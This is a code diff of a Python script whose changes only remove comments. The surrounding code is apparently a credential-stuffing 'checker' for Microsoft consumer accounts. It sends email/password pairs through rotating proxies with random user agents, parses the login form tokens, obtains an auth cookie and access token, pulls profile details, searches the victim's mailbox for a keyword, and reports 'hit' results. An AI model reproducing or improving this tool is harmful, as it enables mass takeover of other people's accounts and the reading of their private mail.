@@ -20,13 +20,8 @@ def generate_user_agent():
 
 
 def checker_worker_single(email: str, password: str, keyword: str, stop_event=None):
-    """
-    stop_event: threading.Event - ha set() → AZONNAL kilép
-    """
     if proxy_manager.get_count() > 0:
         for attempt in range(PROXY_RETRIES):
-
-            # STOP ELLENŐRZÉS MINDEN RETRY ELŐTT
             if stop_event and stop_event.is_set():
                 return {"status": "stopped", "reason": "User stopped"}
 
@@ -49,7 +44,6 @@ def checker_worker_single(email: str, password: str, keyword: str, stop_event=No
             finally:
                 session.close()
 
-            # STOP ELLENŐRZÉS RETRY KÖZÖTT
             if stop_event and stop_event.is_set():
                 return {"status": "stopped", "reason": "User stopped"}
 
@@ -60,13 +54,11 @@ def checker_worker_single(email: str, password: str, keyword: str, stop_event=No
 
 def _do_check(session, email, password, keyword, stop_event=None):
     try:
-        # STOP CHECK
         if stop_event and stop_event.is_set():
             return {"status": "stopped", "reason": "User stopped"}
 
         user_agent = generate_user_agent()
 
-        # ====== STEP 1: GET login page ======
         url = (
             "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
             f"client_info=1&haschrome=1&login_hint={email}"
@@ -102,7 +94,6 @@ def _do_check(session, email, password, keyword, stop_event=None):
         except requests.exceptions.RequestException as e:
             return {"status": "error", "reason": f"GET failed: {str(e)[:50]}"}
 
-        # STOP CHECK
         if stop_event and stop_event.is_set():
             return {"status": "stopped", "reason": "User stopped"}
 
@@ -119,7 +110,6 @@ def _do_check(session, email, password, keyword, stop_event=None):
         if not is_microsoft:
             return {"status": "error", "reason": "Not a Microsoft page"}
 
-        # ====== STEP 2: Parse PPFT & urlPost ======
         PPFT = ""
         urlPost = ""
 
@@ -157,11 +147,9 @@ def _do_check(session, email, password, keyword, stop_event=None):
         if not PPFT or not urlPost:
             return {"status": "error", "reason": "No PPFT/urlPost"}
 
-        # STOP CHECK
         if stop_event and stop_event.is_set():
             return {"status": "stopped", "reason": "User stopped"}
 
-        # ====== STEP 3: POST credentials ======
         cookies_dict = session.cookies.get_dict()
         MSPRequ = cookies_dict.get("MSPRequ", "")
         uaid_cookie = cookies_dict.get("uaid", "")
@@ -214,11 +202,9 @@ def _do_check(session, email, password, keyword, stop_event=None):
         except requests.exceptions.RequestException as e:
             return {"status": "error", "reason": f"POST failed: {str(e)[:50]}"}
 
-        # STOP CHECK
         if stop_event and stop_event.is_set():
             return {"status": "stopped", "reason": "User stopped"}
 
-        # ====== STEP 4: Check auth cookie ======
         post_cookies = session.cookies.get_dict()
 
         if "__Host-MSAAUTHP" not in post_cookies:
@@ -237,11 +223,9 @@ def _do_check(session, email, password, keyword, stop_event=None):
             else:
                 return {"status": "error", "reason": "No auth cookie, suspicious response"}
 
-        # STOP CHECK
         if stop_event and stop_event.is_set():
             return {"status": "stopped", "reason": "User stopped"}
 
-        # ====== STEP 5: Extract auth code ======
         auth_code = ""
         post_text = post_response.text if post_response.text else ""
 
@@ -261,10 +245,8 @@ def _do_check(session, email, password, keyword, stop_event=None):
         if CID:
             CID = CID.upper()
 
-        # ====== STEP 6: Get access token ======
         access_token = ""
         if auth_code:
-            # STOP CHECK
             if stop_event and stop_event.is_set():
                 return {"status": "stopped", "reason": "User stopped"}
 
@@ -293,11 +275,9 @@ def _do_check(session, email, password, keyword, stop_event=None):
         if not access_token or not CID:
             return {"status": "error", "reason": "No token after successful auth"}
 
-        # STOP CHECK
         if stop_event and stop_event.is_set():
             return {"status": "stopped", "reason": "User stopped"}
 
-        # ====== STEP 7: Profile ======
         Name = ""
         Country = ""
         Birthdate = "N/A"
@@ -335,11 +315,9 @@ def _do_check(session, email, password, keyword, stop_event=None):
         except Exception:
             pass
 
-        # STOP CHECK
         if stop_event and stop_event.is_set():
             return {"status": "stopped", "reason": "User stopped"}
 
-        # ====== STEP 8: Email search ======
         Total = "NO"
         Date = "N/A"
 
@@ -438,7 +416,6 @@ def _do_check(session, email, password, keyword, stop_event=None):
         except Exception:
             pass
 
-        # ====== STEP 9: Return result ======
         if Total != "0" and Total != "NO" and Total != "":
             return {
                 "status": "hit",
